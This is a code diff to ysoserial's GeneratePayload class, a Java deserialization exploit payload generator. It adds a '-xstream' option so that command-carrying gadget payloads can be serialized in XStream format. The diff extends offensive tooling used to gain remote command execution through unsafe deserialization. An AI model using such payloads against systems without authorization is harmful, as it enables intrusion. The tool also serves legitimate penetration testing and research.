@@ -14,12 +14,14 @@ public class GeneratePayload {
 	private static final int USAGE_CODE = 64;
 
 	public static void main(final String[] args) {
-		if (args.length != 2) {
+		if (args.length != 2 && args.length != 3) {
 			printUsage();
 			System.exit(USAGE_CODE);
 		}
 		final String payloadType = args[0];
 		final String command = args[1];
+        final boolean xstreamDeserialization = (args.length == 3) && args[2].equals("-xstream");
+
 
 		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
 		if (payloadClass == null) {
@@ -33,7 +35,13 @@ public class GeneratePayload {
 			final ObjectPayload payload = payloadClass.newInstance();
 			final Object object = payload.getObject(command);
 			PrintStream out = System.out;
-			Serializer.serialize(object, out);
+
+			if(xstreamDeserialization){
+			    Serializer.serializeXstream(object, out);
+            }else{
+                Serializer.serialize(object, out);
+            }
+
 			ObjectPayload.Utils.releasePayload(payload, object);
 		} catch (Throwable e) {
 			System.err.println("Error while generating or serializing payload");
@@ -45,7 +53,7 @@ public class GeneratePayload {
 
 	private static void printUsage() {
 		System.err.println("Y SO SERIAL?");
-		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'");
+		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]' [-xstream]");
 		System.err.println("  Available payload types:");
 
 		final List<Class<? extends ObjectPayload>> payloadClasses =
